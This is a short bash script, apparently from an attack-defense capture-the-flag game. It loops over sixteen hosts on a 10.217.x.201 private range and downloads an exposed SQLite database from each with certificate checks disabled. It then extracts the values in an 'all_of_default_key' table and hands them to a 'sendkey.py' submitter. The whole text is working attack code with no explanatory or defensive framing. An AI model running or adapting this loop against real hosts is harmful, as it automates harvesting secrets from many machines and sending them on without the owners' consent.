
for i in {1..16}; do
	wget -O db https://10.217.$i.201/Hello/Runtime/Data/all_of_default.db --no-check-certificate 2> /dev/null
	python sendkey.py `sqlite3 db "select * from all_of_default_key"`
	sleep 1
done
